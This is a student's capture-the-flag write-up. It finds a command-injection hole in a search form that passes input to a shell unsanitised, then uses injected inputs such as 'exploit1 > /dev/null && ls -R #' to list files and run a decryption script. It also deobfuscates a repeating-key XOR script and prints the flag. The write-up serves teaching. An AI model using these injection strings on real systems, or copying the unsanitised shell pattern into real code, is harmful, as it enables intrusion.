# Zero Day Shop - Writeup

Leonardo Calzavara, Student's ID: **2146761**

## Finding vulnerabilities in the website

The website is quite simple, just an input box to search a vulnerability. Since we have access to the files of the seized server, we can quickly see that what we send is being executed on the server.

```python
key = request.form.get('key', '')
    
if key == '':
    return 'Error: Please provide a search key', 400

cmd = f"cat {key} && stat -c 'Created: %w | Last Modified: %y' {key}"

try:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
    
    return result.stdout, 200
```

There is a lack of any sort of **sanitization**, which we can exploit to run **arbitrary code** on the server.

If we didn't have access to the source code files, we could had ran a command like the one below to list all the files on the server. (The first part is just to make sure that the `cat` command doesn't fail, and its output isn't shown to the user)

```shell
exploit1 > /dev/null && ls -R #
```

But since, again, we have access to the source code, we can pass `vault.py #` as input to get the contents of the `vault.py` file:

```python
#!/usr/bin/python3
import sys
import base64

def f(_0x9aadx2, _0x9aadx3):
    _0x9aadx5 = ""
    j = 0
    for i in range(len(_0x9aadx3)):
        _0x9aadx5 += chr(ord(_0x9aadx2[j]) ^ ord(_0x9aadx3[i]))
        j = (j + 1) % len(_0x9aadx2)
    return _0x9aadx5

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('[!] Usage: python3 vault.py <in_data>')
        sys.exit(1)
    
    in_data = sys.argv[1]

    in_data = base64.b64decode(in_data).decode('utf-8')
    
    out_data = f("CPP", in_data)
    
    print(out_data)
```

## Finding vulnerabilities in the encryption

It looks like the code has been a bit obfuscated, but by looking at the line below, we can understand that the function is just encrypting the message with a key of value "CPP".

```python
out_data = f("CPP", in_data)
```

So our deobfuscated function, for clarity, is:

```python
def decrypt(key: str, message: str):
    dec_message = ""
    j = 0
    for i in range(len(message)):
        dec_message += chr(ord(key[j]) ^ ord(message[i]))
        j = (j + 1) % len(key)
    return dec_message
```

By looking at the code, we see that this is the decryption script, since it takes as input a `Base64` string and then decrypts it with a fixed key, repeated to match the message's length (**Vigenere cipher**). Where the encryption script would first encrypt the string, and then encode it in `Base64` instead.

This works because of the **XOR** property: `(plain ^ key = enc) == (enc ^ key = plain)`

## Retrieving the key

With this knowledge, we can use the same logic as before to run the `vault.py` script with python on the server to decrypt the intercepted communication with the following input:

```shell
exploit1 > /dev/null && python3 vault.py MCAiKiQqOChgMQ8zciA4cCIPciMPLWAkHCNjICUicA9kNw9kLzxxPg== #
```

To get the flag:

```
spritz{x0r_c1ph3r_1s_n0t_s3cur3_4t_4ll!}
```
